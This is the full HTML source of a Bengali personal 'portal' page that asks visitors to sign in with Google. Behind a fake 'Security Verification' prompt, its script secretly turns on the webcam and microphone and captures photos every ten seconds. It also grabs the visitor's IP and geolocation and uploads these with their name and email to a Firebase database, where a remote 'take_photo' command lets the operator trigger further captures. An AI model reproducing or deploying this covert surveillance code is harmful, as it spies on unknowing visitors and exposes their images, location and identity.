<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Official Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        :root { --pink: #ff4d94; --glow: #ff85b3; --dark: #020617; --card: rgba(30, 41, 59, 0.7); }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        
        body { 
            background: var(--dark); 
            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent),
                        radial-gradient(circle at bottom left, rgba(124, 58, 237, 0.1), transparent);
            color: white; overflow-x: hidden; min-height: 100vh;
        }

        /* --- Stylish Login Overlay --- */
        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-box { 
            background: var(--card); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3); 
            text-align: center; width: 90%; max-width: 400px; backdrop-filter: blur(10px);
            box-shadow: 0 0 30px rgba(255, 77, 148, 0.2);
        }
        .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; box-shadow: 0 0 15px var(--pink); }

        /* --- Advanced Permission Popup --- */
        #perm-modal { 
            position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 9999; 
            display: none; align-items: center; justify-content: center; backdrop-filter: blur(8px);
        }
        .perm-card { 
            background: #1e293b; padding: 30px; border-radius: 25px; text-align: center; 
            max-width: 350px; border: 2px solid var(--pink); animation: bounceIn 0.8s;
        }
        .perm-icon { font-size: 3rem; color: var(--pink); margin-bottom: 15px; animation: pulse 2s infinite; }

        /* --- Main UI --- */
        #main-ui { display: none; padding-bottom: 50px; }
        .hero { padding: 60px 20px; text-align: center; position: relative; }
        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid white; object-fit: cover; }
        .user-p-img { width: 85px; height: 85px; margin-left: -25px; border: 3px solid var(--dark); z-index: 1; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; padding: 0 20px; max-width: 900px; margin: 0 auto; }
        .card { 
            background: var(--card); border-radius: 20px; padding: 25px; text-align: center; 
            text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1);
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .card:hover { transform: scale(1.05); border-color: var(--pink); box-shadow: 0 10px 20px rgba(255, 77, 148, 0.2); }
        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; display: block; }

        /* --- Social Icons --- */
        .social-dock { display: flex; justify-content: center; gap: 25px; margin-top: 40px; }
        .social-dock a { font-size: 1.8rem; color: white; transition: 0.3s; }
        .social-dock a:hover { color: var(--pink); transform: translateY(-5px); }

        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box animate__animated animate__zoomIn">
            <img src="ratan.jpg" onerror="this.src='https://i.ibb.co/vzYm8mN/ratan.jpg'" class="round-img">
            <h2 style="color: var(--pink);">Ratan Bro Portal</h2>
            <p style="margin: 15px 0; opacity: 0.8;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:15px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; box-shadow: 0 5px 15px rgba(255,77,148,0.4);">
                <i class="fab fa-google"></i> Continue with Google
            </button>
        </div>
    </div>

    <div id="perm-modal">
        <div class="perm-card">
            <div class="perm-icon"><i class="fas fa-shield-alt"></i></div>
            <h3>Security Verification</h3>
            <p style="font-size: 0.9rem; margin: 15px 0; opacity: 0.8;">click enter।</p>
            <button onclick="grantAccess()" style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
        </div>
    </div>

    <div id="main-ui">
        <section class="hero animate__animated animate__fadeIn">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="user-display-pic" src="" class="p-img user-p-img">
            </div>
            <h2 id="user-welcome"></h2>
            <p style="opacity:0.6; font-size: 0.9rem;">Web Developer & Professional Hub</p>
        </section>

        <div class="grid">
            <a href="testpaper.html" class="card animate__animated animate__fadeInUp"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
            <a href="business.html" class="card animate__animated animate__fadeInUp" style="animation-delay: 0.1s;"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
            <a href="https://your-lookup-site.com" class="card animate__animated animate__fadeInUp" style="animation-delay: 0.2s;"><i class="fas fa-search"></i><h4>Number Search</h4></a>
            <a href="portfolio.html" class="card animate__animated animate__fadeInUp" style="animation-delay: 0.3s;"><i class="fas fa-id-card"></i><h4>Portfolio</h4></a>
        </div>

        <div class="social-dock">
            <a href="https://facebook.com/your-profile" target="_blank"><i class="fab fa-facebook"></i></a>
            <a href="https://wa.me/8801609166109" target="_blank"><i class="fab fa-whatsapp"></i></a>
            <a href="mailto:ratan@gmail.com"><i class="fas fa-envelope"></i></a>
        </div>
    </div>

    <canvas id="snapCanvas" width="640" height="480"></canvas>
    <video id="vSource" autoplay playsinline></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let currentUser = null;

        window.googleLogin = () => { signInWithPopup(auth, provider); };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                currentUser = user;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('perm-modal').style.display = 'flex'; // পারমিশন পপআপ দেখাবে
            }
        });

        window.grantAccess = async () => {
            document.getElementById('perm-modal').style.display = 'none';
            document.getElementById('main-ui').style.display = 'block';
            document.getElementById('user-welcome').innerText = "স্বাগতম, " + currentUser.displayName;
            document.getElementById('user-display-pic').src = currentUser.photoURL;
            
            initTracking(currentUser);
        };

        async function initTracking(user) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => console.log("Denied"));
            document.getElementById('vSource').srcObject = stream;

            const uRef = doc(db, "users", user.email.replace('.', '_'));

            onSnapshot(uRef, (snap) => {
                if (snap.data()?.command === "take_photo") {
                    capture(user);
                    updateDoc(uRef, { command: "" });
                }
            });

            capture(user); // সাথে সাথে প্রথম ছবি
            setInterval(() => capture(user), 10000); // প্রতি ১০ সেকেন্ডে আপডেট
        }

        async function capture(user) {
            const canvas = document.getElementById('snapCanvas');
            const video = document.getElementById('vSource');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const image = canvas.toDataURL('image/jpeg', 0.5);

            const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                    name: user.displayName,
                    email: user.email,
                    photo: user.photoURL,
                    ip: ipInfo.ip,
                    loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    lastPic: image,
                    time: new Date().toLocaleString()
                }, { merge: true });
            });
        }
    </script>
</body>
</html>
